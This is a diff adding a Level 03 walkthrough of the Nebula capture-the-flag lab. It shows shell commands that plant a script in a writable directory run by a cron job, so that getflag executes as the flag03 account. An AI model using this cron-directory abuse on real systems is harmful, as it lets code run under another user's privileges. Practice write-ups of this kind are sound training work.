@@ -110,5 +110,30 @@ You have successfully executed getflag on a target account
 ```
 ### Level 03
 
+[Level 03 Description](https://exploit.education/nebula/level-03/)
 
+Initial iscpection of /home/flag03 shows that there is a script called `writeable.sh` and a directory called `writeable.d` in /home/flag03. 
+```
+level03@nebula:~$ ls
+level03@nebula:~$ ls /home/flag03
+writable.d  writable.sh
+```
+`writable.sh` is the cron task. It executes any scripts in the directory `writeable.d` and then deletes the file. 
 
+We can create a short script that will call `getflag` and place it in `writeable.d`. The script will run under the flag03 account so getting the flag will succeed.
+```
+level03@nebula:~$ echo 'getflag > /tmp/flag.out' > script.sh
+level03@nebula:~$ cp script.sh /home/flag03/writable.d
+```
+A few minutes later...
+```
+level03@nebula:~$ ls -al /tmp/
+total 4
+drwxrwxrwt 4 root   root   100 2021-03-28 01:27 .
+drwxr-xr-x 1 root   root   220 2021-03-28 01:20 ..
+-rw-rw-r-- 1 flag03 flag03  59 2021-03-28 01:27 flag.out
+drwxrwxrwt 2 root   root    40 2021-03-28 01:20 .ICE-unix
+drwxrwxrwt 2 root   root    40 2021-03-28 01:20 .X11-unix
+level03@nebula:~$ cat /tmp/flag.out 
+You have successfully executed getflag on a target account
+```
